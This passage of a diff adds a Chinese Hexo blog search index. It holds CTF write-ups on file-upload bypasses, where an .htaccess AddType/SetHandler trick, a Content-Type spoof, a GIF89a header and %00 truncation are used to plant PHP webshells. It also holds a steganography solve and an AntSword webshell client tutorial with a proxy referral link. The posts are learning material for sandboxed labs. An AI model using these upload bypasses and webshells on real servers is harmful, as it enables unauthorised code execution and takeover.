+<h4 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h4><p>右键查看源码，发现该网站只支持”jpg”、”png”、”gif”,所以将一句话木马后缀名添加”.jpg”上传</p>
+<p>burp suite抓包–&gt;将一句话木马后缀名恢复成”.php”，放包</p>
+<p>上蚁剑。</p>
+<h4 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h4><h5 id="htaccess是什么？"><a href="#htaccess是什么？" class="headerlink" title=".htaccess是什么？"></a>.htaccess是什么？</h5><p> .htaccess叫分布式配置文件，全称是Hypertext Access(超文本入口),它提供了针对目录改变配置的方法——在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。并且子目录中的指令会覆盖更高级目录或者主服务器配置文件中的指令。</p>
+<p>作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。.htaccess文件是用于apache服务器下的控制文件访问的配置文件，因此Nginx下是不会生效的。.htaccess可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档、文件的跳转等功能。</p>
+<h5 id="htaccess-文件上传漏洞原理："><a href="#htaccess-文件上传漏洞原理：" class="headerlink" title=".htaccess 文件上传漏洞原理："></a>.htaccess 文件上传漏洞原理：</h5><p>一般.htaccess可以用来留后门和针对黑名单绕过</p>
+<p>创建一个txt写入：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
+
+<p>把”jpg”文件当作”php”文件解析</p>
+<p>重命名为”.htaccess”</p>
+<p>另一种做法：封装：<br>&lt;FilesMatch “1”&gt;<br>SetHandler application/x-httpd-php<br><br>此方法将名为”1”的文件解析为”php”</p>
+<h5 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h5><p>上传”.htaccess”文件，提交</p>
+<p>目的是替换原有的”.htaccess”文件</p>
+<p>上传”一句话木马.jpg”，提交</p>
+<p>上蚁剑。</p>
+<h4 id="MEMI绕过"><a href="#MEMI绕过" class="headerlink" title="MEMI绕过"></a>MEMI绕过</h4><h5 id="什么是MEMI"><a href="#什么是MEMI" class="headerlink" title="什么是MEMI"></a>什么是MEMI</h5><p>MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。</p>
+<h5 id="MEMI绕过的原理"><a href="#MEMI绕过的原理" class="headerlink" title="MEMI绕过的原理"></a>MEMI绕过的原理</h5><p>部分Web应用系统判定文件类型是通过content-type字段，黑客可以通过抓包，将content-type字段改为常见的图片类型，如image/gif，从而绕过校验。</p>
+<h5 id="常见的MIME类型"><a href="#常见的MIME类型" class="headerlink" title="常见的MIME类型"></a>常见的MIME类型</h5><p>text/plain（纯文本）<br>text/html（HTML文档）<br>text/javascript（js代码）<br>application/xhtml+xml（XHTML文档）<br>image/gif（GIF图像）<br>image/jpeg（JPEG图像）<br>image/png（PNG图像）<br>video/mpeg（MPEG动画）<br>application/octet-stream（二进制数据）<br>application/pdf（PDF文档）</p>
+<h5 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h5><p>上传”一句话木马.php”,Burp Suit抓包</p>
+<p>raw栏，修改Conte-Type: application/octet-stream为</p>
+<p>Conte-Type: image/png</p>
+<p>放包</p>
+<p>上蚁剑。</p>
+<h4 id="文件头检查"><a href="#文件头检查" class="headerlink" title="文件头检查"></a>文件头检查</h4><p>提交”一句话木马.php”文件后报错，返回为只允许”jpeg,jpg,png,gif”类型文件</p>
+<p>上传”一句话木马.php”，Burp Suite抓包；</p>
+<p>修改Content-Type: image/gif</p>
+<p>给一句话木马前添加”gif”文件的文件头，”GIF89a”,放包；</p>
+<p>上蚁剑。</p>
+<h4 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h4><p>先上个图</p>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/00%E6%88%AA%E6%96%AD1.png?versionId=CAEQDhiBgID3vcP3xhciIGVlYmM3NzYzNzgzNjQ1M2Q5ZGI3ZWU0NTAzOTAzMDE4"></p>
+<h5 id="什么是00截断"><a href="#什么是00截断" class="headerlink" title="什么是00截断"></a>什么是00截断</h5><p>00截断的原理，就是利用0x00是字符串的结束标识符，攻击者可以利用手动添加字符串标识符的方式来将后面的内容进行截断，而后面的内容又可以帮助我们绕过检测。</p>
+<p>需要注意的是，0x00截断是16进制的截断，需要修改16进制的数据头，如果使用burp，就要在Hex中对数据进行改写。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00截断的限制条件是PHP&lt;5.3.29，且GPC关闭，一般在url上</span><br></pre></td></tr></table></figure>
+
+<p>在url中 %00 表示ascll码中的 0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。</p>
+<h5 id="表达方式"><a href="#表达方式" class="headerlink" title="表达方式"></a>表达方式</h5><p>0x00 ， %00 ， /00 </p>
+<h5 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h5><p>上传”一句话木马.php%00.jpg”时，后台读取到”一句话木马.php”就停止了。</p>
+<h5 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h5><p>上传一句话”1.php”，BP抓包</p>
+<p>修改如下</p>
+<ol>
+<li>Post添加1.php%00</li>
+<li>filename修改为”1.jpg”</li>
+</ol>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/00%E6%88%AA%E6%96%AD2.png?versionId=CAEQDhiBgMD2k77.xhciIGRjNThlNDE0Yjc1MDQ4NGFiMzAzNjJkNzRjMzIwMTI1"></p>
+<p>放包</p>
+<p>上蚁剑？</p>
+<p>踩坑预警</p>
+<p><a href="http://challenge-e119f2f1e564a7be.sandbox.ctfhub.com:10080/?road=/var/www/html/upload/1.php">http://challenge-e119f2f1e564a7be.sandbox.ctfhub.com:10080/?road=/var/www/html/upload/1.php</a></p>
+<p>错误演示</p>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/00%E6%88%AA%E6%96%AD4.png?versionId=CAEQDhiBgMCArsz.xhciIGU4ZjRhNzI1OWFkZDQ5MjdhMWRlMTkxOTc2MTZhMjhi"></p>
+<p>将”?road=/var/www/html”删除，直接访问</p>
+<p><a href="http://challenge-e119f2f1e564a7be.sandbox.ctfhub.com:10080/upload/1.php">http://challenge-e119f2f1e564a7be.sandbox.ctfhub.com:10080/upload/1.php</a></p>
+<p>正确连法</p>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/00%E6%88%AA%E6%96%AD3.png?versionId=CAEQDhiBgMDrk77.xhciIDkxOGRjOTJlZjA5NjRkYWNhZThhMTkwMDQ0YmY4YjBk"></p>
+<p>粘贴一段原话</p>
+<p><em><u>“action=?road=var/www/html/upload/“和$des = $_GET[‘road’] . “/“ . rand(10, 99) . date(“YmdHis”) . “.” . $ext;这段代码的意思是将上传的文件放在upload文件夹中，而直接访问?road=var/www/html/upload/会再次调用代码（本来会报错，但@和服务器端都抑制了报错），所以只需要访问/upload/1.php就可以了</u></em></p>
+<p>连接成功，获取flag！</p>
+<h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><p>打开靶机上传一句话成功后发现并不是我们想要的结果</p>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%871.png?versionId=CAEQDhiBgMC4_IH_xhciIDU0Y2EwNTc2ZjRlZjQ1ZGM5MTQ5MTcyZGVmOTU3ZmQ0"></p>
+<p>根据提示使用双写绕过：</p>
+<p>BP抓包；</p>
+<p>将文件后缀名修改为”pphphp”；</p>
+<p>放包；</p>
+<p>上蚁剑。</p>
+<p>至此文件上传告一段落</p>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.png?versionId=CAEQDhiBgIDqj4f_xhciIGIxZWYxZmZhMGY1NjQ0ZWRhOTc5ODUxYTljYjE2NTZk"></p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>write up</tag>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>蓝帽杯</title>
+    <url>/2021/04/22/%E8%93%9D%E5%B8%BD%E6%9D%AF/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ctf 不是全部，只是学习安全的一种的方式！</p>
+<span id="more"></span>
+<h5 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h5><p>在此之前把蓝帽杯看的太重了，以至于没有分配到厉害的师兄难过了一段时间，但最终还是以戏剧收场。等待结果ing</p>
+<h5 id="web滑雪大冒险"><a href="#web滑雪大冒险" class="headerlink" title="web滑雪大冒险"></a>web滑雪大冒险</h5><p>一句话，就是玩</p>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E8%93%9D%E5%B8%BD%E6%9D%AF/%E6%BB%91%E9%9B%AA%E5%A4%A7%E5%86%92%E9%99%A9.png?versionId=CAEQFRiBgMCKoerTyxciIDU3YjA0OWQ0N2U3NTQxOWRiNjNlYjBmMGI3NzE1N2U5"></p>
+<h4 id="misc冬奥会-is-coming"><a href="#misc冬奥会-is-coming" class="headerlink" title="misc冬奥会_is_coming"></a>misc冬奥会_is_coming</h4><p>打开图片，从文件大小猜测有隐藏文件，打开Kali使用binwalk 分离，获得rar文件，解压获得encode.mp3</p>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E8%93%9D%E5%B8%BD%E6%9D%AF/%E5%86%AC%E5%A5%A5%E4%BC%9A1.png?versionId=CAEQFRiBgMC3k.rTyxciIDA0MzRhYTU5Y2RiMDQ0ODFiOTkyYmY5OGY1NTA4ZDg3"></p>
+<p>先用winhex查看发现文件尾部有cipher</p>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E8%93%9D%E5%B8%BD%E6%9D%AF/%E5%86%AC%E5%A5%A5%E4%BC%9A10.png?versionId=CAEQFRiBgMDxk.rTyxciIGVmZDE3MGZiZWQ2YTQ0Njc4OTI0ZmY2MzcxMmQ4MWVj"></p>
+<p>打开kali 使用cat命令获得密文</p>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E8%93%9D%E5%B8%BD%E6%9D%AF/%E5%86%AC%E5%A5%A5%E4%BC%9A11.png?versionId=CAEQFRiBgMCElOrTyxciIDI3OWFhZDg4MGU5ZjQwZjBhZjA0ZTRiNTg2ODE4YmIy"></p>
+<p>为emoji加密，通过查找猜测为emoji-aes加密，但是找不出密钥，所以继续分析MP3文件</p>
+<p>MP3文件，联想encode编码猜测为mp3stego隐写，联想冬奥会举办时间，2022年2月4日，猜测密码为20220204，获取文件encode.mp3.txt</p>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E8%93%9D%E5%B8%BD%E6%9D%AF/%E5%86%AC%E5%A5%A5%E4%BC%9A2.png?versionId=CAEQFRiBgMDzl.rTyxciIDQ4NmViZDMzMjM2NDQ5MjNiZDc5NDJiODEzZjNmOGE5"></p>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E8%93%9D%E5%B8%BD%E6%9D%AF/%E5%86%AC%E5%A5%A5%E4%BC%9A3.png?versionId=CAEQFRiBgMCKlurTyxciIGUzZmQ4NWIzZTVkNDRkYjc5ODQwNDJkZDA5Y2JiOWEx"></p>
+<p>先替换\x，将编码进行16进制解码，获得一串符号密文</p>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E8%93%9D%E5%B8%BD%E6%9D%AF/%E5%86%AC%E5%A5%A5%E4%BC%9A7.png?versionId=CAEQFRiBgMD0murTyxciIGZlYmM5ODcwN2M5MzRmZjA5YTVkNWEyY2VhM2ViOGI5"></p>
+<p>查找知道这是wingding加密，通过在线工具解码</p>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E8%93%9D%E5%B8%BD%E6%9D%AF/%E5%86%AC%E5%A5%A5%E4%BC%9A8.png?versionId=CAEQFRiBgMCrpurTyxciIDhmY2ZhZjgxNjI0NDQzNjJiNWMzNzg0NWYyZjIxNzE2"></p>
+<p>GitHub搜索1cePeak储存库</p>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E8%93%9D%E5%B8%BD%E6%9D%AF/%E5%86%AC%E5%A5%A5%E4%BC%9A5.png?versionId=CAEQFRiBgMDUmOrTyxciIGVmNzViYThmZDFjYjQ2N2RhNGJmNjM4ZDY0YWViN2Ji"></p>
+<p>本以为直接下载即可获得key，没成想结果如下</p>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E8%93%9D%E5%B8%BD%E6%9D%AF/%E5%86%AC%E5%A5%A5%E4%BC%9A4.png?versionId=CAEQFRiBgMCNmOrTyxciIDMxNzNjOTU1ZWExMTQ2OWM4MmRiZDg4MDgyZDFhNGNi"></p>
+<p>最后进入post-checkout界面下载获得key</p>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E8%93%9D%E5%B8%BD%E6%9D%AF/%E5%86%AC%E5%A5%A5%E4%BC%9A6.png?versionId=CAEQFRiBgICimerTyxciIDY0MmMzZmQ2ODNjYjRmNDM4ODEwODE4YWNkYzM2NDlh"></p>
+<p>获得key</p>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E8%93%9D%E5%B8%BD%E6%9D%AF/%E5%86%AC%E5%A5%A5%E4%BC%9A9.png?versionId=CAEQFRiBgIClnOrTyxciIDliZDJiNGFiODVkYTQ5MzdhZTAwZTQ5ZDgyZjdhNzZj">)</p>
+<p>How_6ad_c0uld_a_1cePeak_be?</p>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E8%93%9D%E5%B8%BD%E6%9D%AF/%E5%86%AC%E5%A5%A5%E4%BC%9A12.png?versionId=CAEQFRiBgMCNlerTyxciIDczYjdiMmU1ZTgzNDQyODFhY2YxYWI5M2QyYzQ1YmQ5"></p>
+<p>综上，获取flag</p>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E8%93%9D%E5%B8%BD%E6%9D%AF/%E5%86%AC%E5%A5%A5%E4%BC%9A13.png?versionId=CAEQFRiBgMDGlurTyxciIDY3MjUyM2ViZTVhNTQxMDNiOGUzOTVjYzYyNTFmNDk2"></p>
+<h5 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h5><p>三解，排名82。审核能已过，期待参加第一场线下赛。</p>
+]]></content>
+      <categories>
+        <category>competition</category>
+      </categories>
+      <tags>
+        <tag>write up</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>蚁剑使用</title>
+    <url>/2021/04/15/%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>中国蚁剑一把梭</p>
+<span id="more"></span>
+
+<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>官网下载：<a href="https://github.com/AntSwordProject/">https://github.com/AntSwordProject/</a></p>
+<p><a href="https://github.com/AntSwordProject/AntSword-Loader"> AntSword-Loader </a></p>
+<p>下载AntSword 加载器</p>
+<p>（注：安装路径一定要为英文路径）</p>
+<p>打开文件夹，找到AntSword.exe,选择以管理员身份运行；</p>
+<p>选择一个空文件夹初始化，自动下载源码，完成。</p>
+<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>右键–&gt;添加数据</p>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E8%9A%81%E5%89%91%E4%BD%BF%E7%94%A81.png?versionId=CAEQDhiBgICp_v3fxhciIDUyYWQwYzhkNDhjODQyNThhOGE5MTliZjhkZDAxMmRl"></p>
+<p>输入网址以及相对路径，连接密码，测试链接成功后保存</p>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E8%9A%81%E5%89%91%E4%BD%BF%E7%94%A82.png?versionId=CAEQDhiBgMDcq4TgxhciIDkwOGY0MGVhMWI1YTQwZjRiN2EyNTg0MTk2OTQxN2Q2"></p>
+<p>大功告成！</p>
+<p>（连接方法有很多种，目前处于学习阶段只列出了最简单的方式）</p>
+<h4 id="插件的使用"><a href="#插件的使用" class="headerlink" title="插件的使用"></a>插件的使用</h4><p>它的插件不能直接使用，需要带科学上网。</p>
+<p>下面是科学上网邀请</p>
+<p><a href="https://xtunnel-aff.icu/auth/register?code=T4Ve">https://xtunnel-aff.icu/auth/register?code=T4Ve</a></p>
+<p>后续更新中……</p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>tool</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>First</title>
+    <url>/2021/03/27/first/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>搭建博客成功！<br> <span id="more"></span><br>  此次搭建博客的历程，由于对命令的不理解导致饶了许多弯路。<br>搭建博客的目的是为了更好的学习，今后也一定要不忘初心，多逛逛大佬的博客，常更新自己的博客。</p>
+<p>最后在此鸣谢电子马同学的大力支持。<br>附上搭建博客教程：<a href="https://zhuanlan.zhihu.com/p/102592286">https://zhuanlan.zhihu.com/p/102592286</a></p>
+]]></content>
+      <categories>
+        <category>dailylife</category>
+      </categories>
+      <tags>
+        <tag>daily</tag>
       </tags>
   </entry>
 </search>
